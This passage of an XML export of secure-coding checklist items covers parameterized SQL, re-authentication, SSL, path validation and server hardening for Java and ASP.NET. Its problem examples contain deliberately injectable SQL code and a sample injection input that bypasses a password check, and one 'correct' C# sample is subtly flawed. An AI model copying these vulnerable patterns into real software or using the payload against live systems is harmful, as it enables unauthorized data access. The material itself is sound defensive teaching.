&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Identify all critical functionality within your application. &lt;/strong&gt;
Locate all critical functionality within your application's code base. Common places to look include:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Creating new accounts &lt;/li&gt;&lt;li&gt;Changing passwords for existing users &lt;/li&gt;&lt;li&gt;User transactions that are sensitive in nature &lt;/li&gt;&lt;li&gt;Changing your application's global configuration &lt;/li&gt;&lt;li&gt;Any operation affecting your application's overall wellness such as start-up and shutdown&lt;/li&gt;&lt;/ul&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Ensure that your application has adopted a&amp;nbsp;re-authentication mechanism.
&lt;/strong&gt;Ensure that your application's design and requirements ask for re-authentication mechanisms. Common re-authentication mechanisms include:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Current password:&lt;/strong&gt; The user uses their current password to confirm the identity. This technique ensures that the given user is aware of the action to be performed and holds responsibility for executing it.
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;CAPTCHA:&lt;/strong&gt; CAPTCHA is a mechanism where alpha-numeric codes are embedded into displayed pictures. Forcing the user to confirm the embedded code ensures that the application is interacting with a human. If your application uses CAPTCHA, ensure
 that your version of CAPTCHA is up-to-date with its security updates.&lt;/li&gt;&lt;/ul&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Verify that re-authentication is enforced. &lt;/strong&gt;Ensure that the re-authentication procedures are positioned properly throughout your application's critical functionality. Verify that re-authentication is performed immediately upon entering a
 critical component. Example:&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;public boolean changePassword(String user, char[] oldPass, char[] newPass)&lt;br&gt;{&lt;br&gt;      // The application forces re-authentication&lt;br&gt;      if(!validateUser(user, oldPass))&lt;br&gt;      {&lt;br&gt;            return false;&lt;br&gt;      }&lt;br&gt;      // Logic to critical functionality&lt;br&gt; }  &lt;/pre&gt;
&lt;/blockquote&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;h1&gt;Problem Example&lt;/h1&gt;
&lt;p&gt;The following code allows a user to change their credentials. Unfortunately, the code enters the new credentials into the credentials repository without verifying that it is the actual user changing the credentials.&lt;/p&gt;
&lt;br&gt;
&lt;blockquote&gt;
&lt;pre&gt;&amp;gt;public boolean changePassword(String user, char[] oldPass, char[] newPass)&lt;br&gt;&lt;br&gt;       // The application fails to re-authenticate the user,&lt;br&gt;       // Verify that new password meets password requirements, or&lt;br&gt;       // Update the credential store with the new password&lt;br&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;h1&gt;Related Guideline&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:AF1E9FAA-A4CB-447F-B1CD-28BB48BE7568"&gt;Guideline: Force Re-Authentication When Executing Critical Functionality (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;/ul&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>1c6916b0-53e4-45a1-804a-0ab1173b3b6b</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Type Safe SQL Parameters are Used</title>
    <topic>Security</topic>
    <technology>Java</technology>
    <category>Data Access</category>
    <phase>Implementation</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Ensure that type safe SQL parameters are used when performing database transactions.&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;Attackers can use a &lt;a href="?#ruledisplay:1D4FA7AF-33F0-40D9-9665-A31DBF3D7764"&gt;
SQL Injection Attack&lt;/a&gt; to manipulate the database in unforeseen ways. SQL injection allows an attacker to assume the credentials of the SQL account used to connect to the database, which may lead to arbitrary reading, writing, updating or deleting of data.
 In an improperly secured database, this can also lead to remote code execution through the use of certain stored procedures that allow for direct Operating System command injection.&lt;/p&gt;
&lt;h1&gt;How to Check&lt;/h1&gt;
&lt;p&gt;To check if parameterized queries are used:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Identify all database transactions. &lt;/strong&gt;Locate all SQL queries throughout your application. Example:&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;&amp;quot;select user from myappUsers where user = ? and pass = ?;&amp;quot;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Verify that each transaction uses Stored Procedures. &lt;/strong&gt;Verify that your application interacts with the backend database through the use of Stored Procedures. Ensure that all SQL queries look like:&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;Connection.prepareStatement(&amp;quot;exec PlaceOrder(?, ?, ?);&amp;quot;);&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;p&gt;and not like:&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;Connection.prepareStatement(&amp;quot;insert into PendingPurchases &amp;quot;&lt;br&gt;                          &amp;#43; &amp;quot;(customer, item, quantity) values (?, ?, ?);&amp;quot;);&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Verify that each transaction uses Prepared Statement. &lt;/strong&gt;Verify that each SQL query is executed through the use of a PreparedStatement object. Example:&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;Connection cn = MyApp.getDBConnection();&lt;br&gt;PreparedStatement st = cn.prepareStatement(&amp;quot;select user from myappUsers where user = ? and pass = ?;&amp;quot;);&lt;br&gt;st.setString(1, user);&lt;br&gt;st.setString(2, new String(passDigest));&lt;br&gt;ResultSet rs = st.executeQuery();&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;h1&gt;Problem Example&lt;/h1&gt;
&lt;p&gt;The following code validates the user based on a given username and password. It hashes the password with a random salt. Then it compares the username and the produced hash against the data stored in the backend database. Unfortunately, the SQL query is
 dynamically crafted by using the user's input. If there is no proper input validation, an attacker can access the application's database server through the use of SQL injection.&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;public boolean validateUser(String user, char[] pass)&lt;br&gt;{&lt;br&gt;      // Hash the credentials before querying the credential store&lt;br&gt;      // The application crafts the SQL query based on user's input&lt;br&gt;      Connection cn = MyApp.getDBConnection();&lt;br&gt;      Statement st = cn.createStatement();&lt;br&gt;      String query = &amp;quot;select login_attempts from myappUsers where user = \&amp;quot;&amp;quot;&lt;br&gt;                    &amp;#43; user &amp;#43; &amp;quot;\&amp;quot; and pass = \&amp;quot;&amp;quot; &amp;#43; passHash &amp;#43; &amp;quot;\&amp;quot;;&amp;quot;;&lt;br&gt;      ResultSet rs = st.executeQuery(query);&lt;br&gt;      // Execute the rest of the authentication steps&lt;br&gt;}&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;h1&gt;Additional Resources&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;To learn more about using parameterized queries in Java, see: &lt;a href="http://java.sun.com/j2se/1.4.2/docs/api/java/sql/PreparedStatement.html"&gt;
PreparedStatement&lt;/a&gt;. &lt;/li&gt;&lt;li&gt;For more information about preventing SQL injection attacks, visit: &lt;a href="http://www.owasp.org/index.php/Reviewing_Code_for_SQL_Injection"&gt;
Reviewing Code for SQL Injection&lt;/a&gt;&amp;nbsp;from OWASP. &lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Related Guideline&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:9DF701E2-7929-4533-9DC3-368AAC4E553D"&gt;Guideline: Use Type Safe SQL Parameters When Constructing SQL Queries (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:ADE80907-B490-4FD3-81A8-826117E25662"&gt;Guideline: Use Stored Procedures (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;/ul&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>1d8ca2b4-a984-433c-8b93-5fdd2d39f0ce</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>For Communication Between Web Browser and Web Server, SSL is used When Pages Need to be Encrypted</title>
    <topic>Security</topic>
    <technology>ASP.NET 3.5</technology>
    <category>Communication Security</category>
    <phase>Implementation</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Ensure that SSL is used when pages need to be encrypted and&amp;nbsp;to guarantee that the server to which you send the data is the server that you expect.
&lt;/p&gt;
&lt;br&gt;
&lt;h1&gt;How to Fix&lt;/h1&gt;
&lt;p&gt;Using SSL is expensive. Use SSL only for pages that require it. This includes pages that contain or capture sensitive data, such as pages that accept credit card numbers and passwords. Use SSL only if the following conditions are true:
&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;You want to encrypt the page data. &lt;/li&gt;&lt;li&gt;You want to guarantee that the server to which you send the data is the server that you expect.
&lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;For pages where you must use SSL, follow these guidelines: &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Make the page size as small as possible. &lt;/li&gt;&lt;li&gt;Avoid using graphics that have large file sizes. If you use graphics, use graphics that have smaller file sizes and resolution, or use graphics from a site that is not secure. However, when you use graphics from a site that is not secure, some Web browsers
 may display a dialog box that asks the user if the user wants to display the content from the site that is not secure.
&lt;/li&gt;&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance. &lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>1da54486-ddf2-488b-a0c8-4e4c67b96b21</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>If Input File Names are Required, They are Well Formed and are Verifiably Valid Within the Application Context</title>
    <topic>Security</topic>
    <technology>ASP.NET 3.5</technology>
    <category>Input and Data Validation</category>
    <phase>Implementation</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Ensure that user-supplied filenames or paths are in the correct format and point to a valid location in the context of your application.
&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;Malicious file input can be used to coerce your application into accessing arbitrary files and resources.
&lt;/p&gt;
&lt;h1&gt;How to Check&lt;/h1&gt;
&lt;p&gt;If your application accepts user supplied files or paths, ensure that they are passed through a validation routine. The validation routine should not only check for appropriate format, but also ensure that the file name is legitimate for your application.&lt;/p&gt;
&lt;p&gt;For more information on input validation, see the related checklist item All Input is Validated for Length, Range, Format, and Type, linked below.
&lt;/p&gt;
&lt;h1&gt;How to Fix&lt;/h1&gt;
&lt;p&gt;Use the following steps to fix this issue:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Check File Names. &lt;/strong&gt;Ensure that file paths only refer to files within your application's virtual directory hierarchy if that is appropriate. When checking file names, obtain the full name of the file by using the
&lt;strong&gt;System.IO.Path.GetFullPath&lt;/strong&gt; method. &lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Check File Paths. &lt;/strong&gt;If you use &lt;strong&gt;MapPath&lt;/strong&gt; to map a supplied virtual path to a physical path on the server, use the overloaded
&lt;strong&gt;Request.MapPath&lt;/strong&gt; method that accepts a &lt;strong&gt;bool&lt;/strong&gt; parameter so that you can prevent cross-application mapping. The following code example shows this technique:&lt;/p&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;blockquote&gt;
&lt;pre&gt;try&lt;br&gt;{&lt;br&gt; string mappedPath = Request.MapPath( inputPath.Text,&lt;br&gt;                                       Request.ApplicationPath, false);&lt;br&gt;}&lt;br&gt;catch (HttpException)&lt;br&gt;{&lt;br&gt; // Cross-application mapping attempted &lt;br&gt;}&lt;/pre&gt;
&lt;p&gt;The final &lt;strong&gt;false&lt;/strong&gt; parameter prevents cross-application mapping. This means that a user cannot successfully supply a path that contains &amp;quot;..&amp;quot; to traverse outside of your application's virtual directory hierarchy. Any attempt to do this results
 in an exception of type &lt;strong&gt;HttpException&lt;/strong&gt;. &lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1&gt;Related Items&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;div&gt;&lt;a href="?#ruledisplay:581e8fff-7841-49ac-8bbe-d74e44aa9bd8"&gt;Checklist Item: All Input is Validated for Length, Range, Format, and Type&lt;/a&gt;&lt;/div&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance. &lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>1ded4c8b-b5b9-4d26-9132-5eab5fa3640f</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Web sites are located on a non-system partition.</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Server Hardening</category>
    <phase>Deployment</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>J.D. Meier, Alex Mackman, Michael Dunner, Srinath Vasireddy, Ray Escamilla and Anandha Murukan</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;div&gt;Web Application&lt;/div&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Check to ensure that the web sites are not located&amp;nbsp;in the default \inetpub\wwwroot directory. It should be on a non-system partition.&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance.&lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>1df0a6e0-3eb7-4d43-a207-6164f08d3421</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Users and administrators do not share accounts.</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Server Hardening</category>
    <phase>Deployment</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>J.D. Meier, Alex Mackman, Michael Dunner, Srinath Vasireddy, Ray Escamilla and Anandha Murukan</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;div&gt;Web Application&lt;/div&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Check to ensure that no shared accounts are created for use by multiple individuals. Make sure that authorized individuals&amp;nbsp;use their own accounts.&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance.&lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>1e909001-bc62-468c-ba18-f4aa03844dd1</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Strong account and password policies are enforced for the server.</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Server Hardening</category>
    <phase>Deployment</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>J.D. Meier, Alex Mackman, Michael Dunner, Srinath Vasireddy, Ray Escamilla and Anandha Murukan</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;div&gt;Web Application&lt;/div&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Check to ensure that strong account and password policies are enforced for the server.&lt;/p&gt;
&lt;br&gt;
&lt;h1&gt;How to Fix&lt;/h1&gt;
&lt;p&gt;To counter password guessing and brute force dictionary attacks on your application, apply strong password policies. To enforce a strong password policy:
&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Set&lt;/strong&gt; &lt;strong&gt;password length and complexity&lt;/strong&gt;. Require strong passwords to reduce the threat of password guessing attacks or dictionary attacks. Strong passwords are eight or more characters and must include both alphabetical and
 numeric characters. &lt;/li&gt;&lt;li&gt;&lt;strong&gt;Set&lt;/strong&gt; &lt;strong&gt;password expiration&lt;/strong&gt;. Passwords that expire regularly reduce the likelihood that an old password can be used for unauthorized access. Frequency of expiration is usually guided by a company's security policy.
&lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;Table&amp;nbsp;below shows the default and recommended password policy settings.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Password Policy Default and Recommended Settings&lt;/strong&gt;&lt;/p&gt;
&lt;div&gt;
&lt;table&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;th&gt;Password Policy&lt;/th&gt;
&lt;th&gt;Default Setting&lt;/th&gt;
&lt;th&gt;Recommended Minimum Setting&lt;/th&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Enforce password history&lt;/td&gt;
&lt;td&gt;1 password remembered.&lt;/td&gt;
&lt;td&gt;24 passwords remembered.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maximum password age&lt;/td&gt;
&lt;td&gt;42 days&lt;/td&gt;
&lt;td&gt;42 days&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Minimum password age&lt;/td&gt;
&lt;td&gt;0 days&lt;/td&gt;
&lt;td&gt;2 days&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Minimum password length&lt;/td&gt;
&lt;td&gt;0 characters&lt;/td&gt;
&lt;td&gt;8 characters&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Passwords must meet complexity requirement.&lt;/td&gt;
&lt;td&gt;Disabled&lt;/td&gt;
&lt;td&gt;Enabled&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Store password using reversible encryption for all users in the domain.&lt;/td&gt;
&lt;td&gt;Disabled&lt;/td&gt;
&lt;td&gt;Disabled&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;
&lt;p&gt;In addition, record failed logon attempts so that you can detect and trace malicious behavior.&lt;/p&gt;
&lt;h1&gt;Additional Resources&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;For more information, see &amp;quot;Step 10. SQL Server Security&amp;quot; in Chapter 18, &amp;quot;&lt;a href="http://msdn2.microsoft.com/en-us/library/aa302434.aspx"&gt;Securing Your Database Server&lt;/a&gt;.&amp;quot;&lt;/li&gt;&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance.&lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>21887be9-a2c6-4d6d-89e9-ea8c20daaf4e</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Authentication Cookies are Not Persisted</title>
    <topic>Security</topic>
    <technology>ASP.NET 3.5</technology>
    <category>Authentication</category>
    <phase>Implementation</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Ensure that&amp;nbsp;authentication cookies are not stored in the user's profile.&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;Stored authentication cookies&amp;nbsp;can be stolen if an attacker gets physical access to the user's computer.
&lt;/p&gt;
&lt;h1&gt;How to Fix&lt;/h1&gt;
&lt;p&gt;To ensure a non-persistent cookie, set the &lt;strong&gt;DisplayRememberMe&lt;/strong&gt; property of the
&lt;strong&gt;Login&lt;/strong&gt; control to &lt;strong&gt;false&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;If you are not using the login controls, you can specify a non-persistent cookie when you call either the
&lt;strong&gt;RedirectFromLoginPage&lt;/strong&gt; or &lt;strong&gt;SetAuthCookie&lt;/strong&gt; methods of the
&lt;strong&gt;FormsAuthentication&lt;/strong&gt; class having validated the user's credentials, as shown here:&lt;/p&gt;
&lt;pre&gt;public void Login_Click(object sender, EventArgs e)&lt;/pre&gt;
&lt;pre&gt;{&lt;br&gt;   // Is the user valid?&lt;br&gt;   if (Membership.ValidateUser(userName.Text, password.Text))&lt;br&gt;   {&lt;br&gt;        // Parameter two set to false indicates non-persistent cookie&lt;br&gt;        FormsAuthentication.RedirectFromLoginPage(username.Text, false);&lt;br&gt;    }&lt;br&gt;    else&lt;br&gt;    {&lt;br&gt;        Status.Text = &amp;quot;Invalid credentials. Please try again.&amp;quot;;&lt;br&gt;    }&lt;br&gt;}&lt;/pre&gt;
&lt;br&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance. &lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>25e29df6-d0ec-42b7-982d-b97331e549a9</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Type Safe SQL Parameters are Used</title>
    <topic>Security</topic>
    <technology>ASP.NET 3.5</technology>
    <category>Data Access</category>
    <phase>Implementation</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>1</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Ensure that type-safe parameters are used when constructing dynamic SQL queries or when passing parameters to stored procedures.&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;If you use the Parameters collection, SQL treats the input is as a literal value rather then as executable code. The Parameters collection can be used to enforce type and length constraints on input data. Values outside of the range trigger an exception.&lt;/p&gt;
&lt;p&gt;If type-safe SQL parameters are not used, attackers might be able to execute injection attacks that are embedded in the unfiltered input.&lt;/p&gt;
&lt;h1&gt;How to Check&lt;/h1&gt;
&lt;p&gt;To check if parameterized queries are used:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Identify all database transactions. &lt;/strong&gt;Locate all SQL queries throughout your application. Example:&lt;/p&gt;
&lt;pre&gt;&amp;quot;select user from myappUsers where user = ? and pass = ?;&amp;quot;&lt;/pre&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Verify that each transaction uses Stored Procedures where possible. &lt;/strong&gt;
Verify that your application interacts with the backend database through the use of Stored Procedures. Ensure that SQL queries look like:&lt;/p&gt;
&lt;pre&gt;SqlCommand myCommand = new SqlCommand(&amp;quot;sp_SelectUser&amp;quot;, myConnection);&lt;br&gt;//Specify our command is a stored procedure&lt;br&gt;myCommand.CommandType = CommandType.StoredProcedure; &lt;/pre&gt;
&lt;p&gt;and not like:&lt;/p&gt;
&lt;pre&gt;string SQLstr = &amp;quot;SELECT * from users&lt;br&gt;   WHERE username = '&amp;quot; &amp;#43; un.Text &amp;#43; &amp;quot;'&lt;br&gt;   AND password = '&amp;quot; &amp;#43; pass.Text &amp;#43; &amp;quot;'&amp;quot;;&lt;br&gt;SqlCommand myCommand = new SqlCommand(SQLstr, myConnection);&lt;/pre&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Verify that type-safe parameters are used. &lt;/strong&gt;Verify that type-safe parameters are used in the dynamic SQL queries or stored procedures by using the SqlParameterCollection class. Example:&lt;/p&gt;
&lt;pre&gt;using (SqlConnection connection = new SqlConnection(connectionString))&lt;br&gt;{&lt;br&gt;  connection.Open();&lt;br&gt;  SqlDataAdapter myDataAdapter = new SqlDataAdapter(&lt;br&gt;         &amp;quot;SELECT * from users WHERE username = '@uname' AND password = '@pwd'&amp;quot;, connection);&lt;br&gt;  myCommand.SelectCommand.Parameters.Add(&amp;quot;@uname&amp;quot;, SqlDbType.VarChar, 24);&lt;br&gt;  myCommand.SelectCommand.Parameters.Add(&amp;quot;@pwd&amp;quot;, SqlDbType.VarChar, 16);&lt;br&gt;  myCommand.SelectCommand.Parameters[&amp;quot;@uname&amp;quot;].Value = un.Text;&lt;br&gt;  myCommand.SelectCommand.Parameters[&amp;quot;@pwd&amp;quot;].Value = pass.Text;&lt;br&gt;  myDataAdapter.Fill(userDataset);  ...  connection.Close();&lt;br&gt;}&lt;/pre&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;h1&gt;Problem Example&lt;/h1&gt;
&lt;p&gt;Consider an ASP.NET application that handles employee payroll functionality for a small company. One of the pages requires retrieving an employee record from a table based on a username and password supplied via a login dialog. The developer of the application
 created an SQL SELECT query to accomplish said task:&lt;/p&gt;
&lt;pre&gt;using (SqlConnection myConnection = new SqlConnection(connectionString))&lt;br&gt;{&lt;br&gt;  connection.Open();&lt;br&gt;  string SQLstr = &amp;quot;SELECT * from users WHERE username = '&amp;quot; &amp;#43; un.Text &amp;#43; &amp;quot;'&lt;br&gt;   AND password = '&amp;quot; &amp;#43; pass.Text &amp;#43; &amp;quot;'&amp;quot;;&lt;br&gt;  SqlCommand myCommand = new SqlCommand(SQLstr, myConnection);&lt;br&gt;  SqlDataAdapter myDataAdapter = new SqlDataAdapter(myCommand);&lt;br&gt;  myCommand.Connection.Open();&lt;br&gt;  SqlDataReader myReader = myCommand.ExecuteReader();&lt;br&gt;  ...&lt;br&gt;}&lt;/pre&gt;
&lt;p&gt;In the preceding example, the SELECT statement will work as expected, assuming that the input is perfectly constrained. However, what happens if a user enters unexpected input such as '1234' for a password, and this for a username:&lt;/p&gt;
&lt;pre&gt;mjones' AND 1=1; -- &lt;/pre&gt;
&lt;p&gt;This will result in the SQL statement being executed at the database level:&lt;/p&gt;
&lt;pre&gt;SELECT * from users WHERE username = 'mjones' AND 1=1; --'  AND password = '1234';&lt;/pre&gt;
&lt;p&gt;This will allow the person entering data into the dialog box to select the account details of mjones without the correct password.&lt;/p&gt;
&lt;h1&gt;Additional Resources&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;To learn more about SQL injection, see: &lt;a href="http://en.wikipedia.org/wiki/SQL_injection"&gt;
SQL Injection&lt;/a&gt; in Wikipedia. &lt;/li&gt;&lt;li&gt;To learn more about countering SQL injection in ASP.NET, visit: &lt;a href="http://msdn2.microsoft.com/en-us/library/ms998271.aspx"&gt;
How To: Protect From SQL Injection in ASP.NET&lt;/a&gt;. &lt;/li&gt;&lt;li&gt;To learn more about countering injection-based attacks in ASP.NET, see: &lt;a href="http://msdn2.microsoft.com/en-us/library/bb355989.aspx"&gt;
How To: Protect From Injection Attacks in ASP.NET&lt;/a&gt;.&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Related Guideline&lt;/h1&gt;
&lt;ul&gt;
